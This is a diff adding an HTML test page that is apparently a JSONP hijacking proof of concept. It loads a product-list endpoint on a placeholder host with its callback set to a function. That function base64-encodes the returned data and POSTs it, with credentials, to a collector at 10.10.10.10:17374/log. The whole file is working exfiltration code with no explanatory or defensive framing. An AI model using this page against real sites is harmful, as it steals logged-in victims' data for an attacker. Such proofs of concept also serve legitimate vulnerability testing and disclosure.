@@ -1,0 +1,21 @@
+<html>
+<head>
+<title>test</title>
+<meta charset="utf-8">
+<script>
+function sendFunc(obj){
+    var s = JSON.stringify(obj);
+    var req = new XMLHttpRequest();
+    req.open('post', 'http://10.10.10.10:17374/log', true);
+    req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+    req.withCredentials = true;
+    
+    b64Str = window.btoa(window.encodeURIComponent(s));
+    req.send('content=' + b64Str); 
+}
+</script>
+</head>
+<body>
+<script type="text/javascript" src="https://xxx.yyy.zzz/List?productName=p2&pageSize=10&pageNo=1&callback=sendFunc"></script>
+</body>
+</html>
